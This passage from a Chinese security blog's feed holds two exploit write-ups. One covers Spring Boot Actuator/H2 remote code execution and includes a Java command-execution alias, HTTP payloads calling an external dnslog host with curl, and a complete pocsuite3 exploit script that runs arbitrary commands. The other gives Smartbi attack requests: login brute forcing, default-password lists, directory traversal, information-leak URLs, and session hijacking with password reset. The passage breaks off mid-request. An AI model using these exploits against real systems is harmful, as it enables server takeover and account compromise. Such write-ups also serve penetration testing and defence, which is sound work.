    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>Spring Boot框架是最流行的基于Java的微服务框架之一，可帮助开发人员快速轻松地部署Java应用程序，加快开发过程。当Spring Boot Actuator配置不当可能造成多种RCE，因为Spring Boot 2.x默认使用HikariCP数据库连接池，所以可通过H2数据库实现RCE。</p><h1 id="HikariCP数据库连接池"><a href="#HikariCP数据库连接池" class="headerlink" title="HikariCP数据库连接池"></a>HikariCP数据库连接池</h1><blockquote><p>之前的两个RCE都是在Spring Boot 1.x版本下进行的，在spring 2.x下的版本如何进行RCE呢。幸运的是，Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个可以RCE的变量。这个变量就是<code>spring.datasource.hikari.connection-test-query</code>。这个变量与HikariCP中的<code>connectionTestQuery</code>配置相匹配。根据文档，此配置定义的是在从池中给出一个连接之前被执行的query，它的作用是验证数据库连接是否处于活动状态。简言之，无论何时一个恶心的数据库连接被建立时，<code>spring.datasource.hikari.connection-test-query</code>的值将会被作为一个SQL语句执行。然后利用SQL语句中的用户自定义函数，进行RCE。</p></blockquote><h1 id="H2-CREATE-ALIAS-命令"><a href="#H2-CREATE-ALIAS-命令" class="headerlink" title="H2 CREATE ALIAS 命令"></a>H2 CREATE ALIAS 命令</h1><p>H2数据库引擎是一个流行的java开发数据库，非常容易与Spring Boot集成，仅仅需要如下的一个dependency。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.h2database&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;h2&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;&#x2F;scope&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE ALIAS创建一个java函数然后调用它，示例如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS GET_SYSTEM_PROPERTY FOR &quot;java.lang.System.getProperty&quot;;</span><br><span class="line">CALL GET_SYSTEM_PROPERTY(&#39;java.class.path&#39;);</span><br></pre></td></tr></table></figure><p>仿照这个，创建命令执行的java函数可以如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String shellexec(String cmd) throws java.io.IOException &#123; </span><br><span class="line">    java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">    if (s.hasNext()) &#123;</span><br><span class="line">        return s.next();</span><br><span class="line">    &#125; throw new IllegalArgumentException(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么RCE所需的SQL语句即:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS &quot;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&quot;;</span><br><span class="line">CALL EXEC(&#39;curl ntxo6i.dnslog.cn&#39;);</span><br></pre></td></tr></table></figure><p>与1.x类似，在端点<code>/actuator/env</code>通过POST方法进行环境变量的赋值。payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;curl ntxo6i.dnslog.cn&#39;);&quot;&#125;</span><br></pre></td></tr></table></figure><p>执行RCE的SQL语句已经构建好，接下来就是触发一个新的数据库连接，通过向端点<code>/actuator/restart</code>发送POST请求，即可重启应用出发新的数据库连接。请求如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122104659742.png" alt="image-20210122104659742"></p><p>命令执行的结果:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122104154963.png" alt="image-20210122104154963"></p><h1 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">import time</span><br><span class="line">from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line">from pocsuite3.api import OptString</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID &#x3D; &#39;00000&#39;  # ssvid</span><br><span class="line">    version &#x3D; &#39;1.0&#39;</span><br><span class="line">    author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">    vulDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    createDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    updateDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    references &#x3D; [&#39;&#39;]</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;spring.io&#x2F;projects&#x2F;spring-boot&#39;</span><br><span class="line">    appName &#x3D; &#39;spring-boot&#39;</span><br><span class="line">    appVersion &#x3D; &#39;2.x&#39;</span><br><span class="line">    vulType &#x3D; VUL_TYPE.XSS</span><br><span class="line">    desc &#x3D; &#39;&#39;&#39;springboot H2 Rce&#39;&#39;&#39;</span><br><span class="line">    samples &#x3D; []</span><br><span class="line">    category &#x3D; POC_CATEGORY.EXPLOITS.WEBAPP</span><br><span class="line"></span><br><span class="line">    def _options(self):</span><br><span class="line">        o &#x3D; OrderedDict()</span><br><span class="line">        o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;Please input your exec&#39;, require&#x3D;True)</span><br><span class="line">        return o</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        url &#x3D; self.url</span><br><span class="line">        url1 &#x3D; self.url + &#39;&#x2F;actuator&#x2F;env&#39;</span><br><span class="line">        url2 &#x3D; self.url + &#39;&#x2F;actuator&#x2F;restart&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;%s&#39;);&quot;&#125;&#39;&#39;&#39; % (self.get_option(&quot;exec&quot;)) </span><br><span class="line">        headers &#x3D; &#123;&#39;content-type&#39; : &#39;application&#x2F;json&#39;&#125;</span><br><span class="line">    </span><br><span class="line">        r1 &#x3D; requests.post(url1, data&#x3D;payload, headers&#x3D;headers)</span><br><span class="line">        #time.sleep(2)</span><br><span class="line">        r2 &#x3D; requests.post(url2, data&#x3D;payload, headers&#x3D;headers)</span><br><span class="line">        if r1.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; self.url</span><br><span class="line">            result[&#39;VerifyInfo&#39;][&#39;Postdata&#39;] &#x3D; (self.get_option(&quot;exec&quot;))</span><br><span class="line"></span><br><span class="line">        return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def parse_output(self, result):</span><br><span class="line">        output &#x3D; Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122113322544.png" alt="image-20210122113322544"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122113340410.png" alt="image-20210122113340410"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级到安全版本</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;p&gt;Spring Boot框架是最流行的基于Java的微服务框架之一，可帮助开发人员快速轻松地部署Java应用程序，加快开发过程
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Spring Boot" scheme="http://www.ol4three.com/tags/Spring-Boot/"/>
    
  </entry>
  
  <entry>
    <title>Smartbi 漏洞总结</title>
    <link href="http://www.ol4three.com/2021/01/18/WEB/Exploit/Smartbi-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/01/18/WEB/Exploit/Smartbi-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-18T02:50:08.000Z</published>
    <updated>2021-01-20T11:49:57.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SmartBi简介"><a href="#SmartBi简介" class="headerlink" title="SmartBi简介"></a>SmartBi简介</h1><p>Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富500强的10家国内银行，有8家选用了Smartbi。</p><h1 id="登录入口"><a href="#登录入口" class="headerlink" title="登录入口"></a>登录入口</h1><p><a href="https://127.0.0.1/vision/mobileportal.jsp">https://127.0.0.1/vision/mobileportal.jsp</a></p><p><a href="https://127.0.0.1/vision/mobileX/login">https://127.0.0.1/vision/mobileX/login</a></p><p><a href="https://127.0.0.1/vision/index.jsp">https://127.0.0.1/vision/index.jsp</a></p><p>密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。</p><h1 id="SmartBi的两种传参方式"><a href="#SmartBi的两种传参方式" class="headerlink" title="SmartBi的两种传参方式"></a>SmartBi的两种传参方式</h1><h2 id="RMIServlet加密"><a href="#RMIServlet加密" class="headerlink" title="RMIServlet加密"></a>RMIServlet加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure><h2 id="直接传输"><a href="#直接传输" class="headerlink" title="直接传输"></a>直接传输</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure><p>ecode加密字段解密后为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserService+updateUserForChange+[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure><p>构造数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure><h1 id="登录暴破"><a href="#登录暴破" class="headerlink" title="登录暴破"></a>登录暴破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.101 Mobile Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;mobileX&#x2F;login</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;1DA1DAA51469E646F97AD829F29A2B15</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;login&amp;params&#x3D;[&quot;admin&quot;,&quot;admin&quot;]</span><br></pre></td></tr></table></figure><p>抓取true/false字段</p><h1 id="401认证弱口令及敏感目录"><a href="#401认证弱口令及敏感目录" class="headerlink" title="401认证弱口令及敏感目录"></a>401认证弱口令及敏感目录</h1><h2 id="401弱口令"><a href="#401弱口令" class="headerlink" title="401弱口令"></a>401弱口令</h2><p>/vision目录下的文件都需要401认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;admin</span><br><span class="line">admin&#x2F;manager</span><br><span class="line">admin&#x2F;2manager</span><br><span class="line">mining&#x2F;admin</span><br><span class="line">demo&#x2F;demo</span><br><span class="line">manager&#x2F;demo</span><br><span class="line">manager&#x2F;admin</span><br><span class="line">user&#x2F;admin</span><br><span class="line">test&#x2F;admin</span><br><span class="line">huanan&#x2F;admin</span><br></pre></td></tr></table></figure><p>实测发现不论用户名输什么，只要密码正确即可</p><h2 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h2><p><a href="https://127.0.0.1/vision/version.txt">https://127.0.0.1/vision/version.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-01-11 15:11:24</span><br></pre></td></tr></table></figure><p><a href="https://127.0.0.1/vision/packageinfo.txt">https://127.0.0.1/vision/packageinfo.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Build Time:20200918153547 </span><br><span class="line">War Type:dist </span><br><span class="line">TAG:Branch_SmartbiV85_6_20190221 </span><br><span class="line">Version:8.5.658863.20385 </span><br><span class="line">VersionType:Smartbi Insight Edition c0d53d51438945fa5b9839b3e0111e660792d2e1 </span><br><span class="line">Spreadsheet fake</span><br></pre></td></tr></table></figure><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><a href="https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F">https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F</a></p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><a href="https://127.0.0.1/vision/monitor/sysprops.jsp">https://127.0.0.1/vision/monitor/sysprops.jsp</a></p><p><a href="https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode">https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode</a></p><p><a href="https://127.0.0.1/vision/monitor/hardwareinfo.jsp">https://127.0.0.1/vision/monitor/hardwareinfo.jsp</a></p><h2 id="接口泄露（直接访问wsdl无需401）"><a href="#接口泄露（直接访问wsdl无需401）" class="headerlink" title="接口泄露（直接访问wsdl无需401）"></a>接口泄露（直接访问wsdl无需401）</h2><p><a href="https://127.0.0.1/vision/listwsdl.jsp">https://127.0.0.1/vision/listwsdl.jsp</a></p><p>提供资源目录树的访问功能<br><a href="https://127.0.0.1/vision/services/CatalogService?wsdl">https://127.0.0.1/vision/services/CatalogService?wsdl</a><br>SimpleReportService 提供灵活报表相关操作功能</p><p> <a href="https://127.0.0.1/vision/services/SimpleReportService?wsdl">https://127.0.0.1/vision/services/SimpleReportService?wsdl</a><br>BusinessViewService 提供数据集定义相关操作功能</p><p> <a href="https://127.0.0.1/vision/services/BusinessViewService?wsdl">https://127.0.0.1/vision/services/BusinessViewService?wsdl</a><br>DataSourceService 提供数据源相关操作功能</p><p> <a href="https://127.0.0.1/vision/services/DataSourceService?wsdl">https://127.0.0.1/vision/services/DataSourceService?wsdl</a><br>AnalysisReportService 提供多维分析相关操作功能</p><p> <a href="https://127.0.0.1/vision/services/AnalysisReportService?wsdl">https://127.0.0.1/vision/services/AnalysisReportService?wsdl</a><br>UserManagerService 提供用户相关操作，包括：读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等</p><p> <a href="https://127.0.0.1/vision/services/UserManagerService?wsdl">https://127.0.0.1/vision/services/UserManagerService?wsdl</a></p><h2 id="session劫持-重置用户密码（无需原密码）"><a href="#session劫持-重置用户密码（无需原密码）" class="headerlink" title="session劫持+重置用户密码（无需原密码）"></a>session劫持+重置用户密码（无需原密码）</h2><p><a href="https://127.0.0.1/vision/monitor/listsessions.jsp">https://127.0.0.1/vision/monitor/listsessions.jsp</a></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112181111262.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112181111262.png" alt="image-20210112181111262"></a></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112140616396.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112140616396.png" alt="image-20210112140616396"></a></p><p>理论上重置成功，返回为true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。</p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112142701281.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112142701281.png" alt="image-20210112142701281"></a></p><p>数据包:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 133</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span 